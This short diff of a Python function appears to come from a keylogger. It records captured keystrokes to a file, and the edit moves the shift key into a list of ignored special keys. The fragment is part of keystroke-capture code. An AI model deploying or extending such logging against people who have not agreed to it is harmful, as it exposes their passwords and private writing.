@@ -66,9 +66,7 @@ def writefile(key):
                 f.write(' ')
             elif key == Key.enter:
                 f.write('\n')
-            elif key == Key.shift:
-                pass
-            elif key == Key.cmd or key == Key.esc or key == Key.ctrl_l or key == Key.alt_l or key == Key.alt_gr or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.backspace:
+            elif key == Key.cmd or key == Key.shift or key == Key.esc or key == Key.ctrl_l or key == Key.alt_l or key == Key.alt_gr or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.backspace:
                 pass
             else:
                 f.write(str(key))
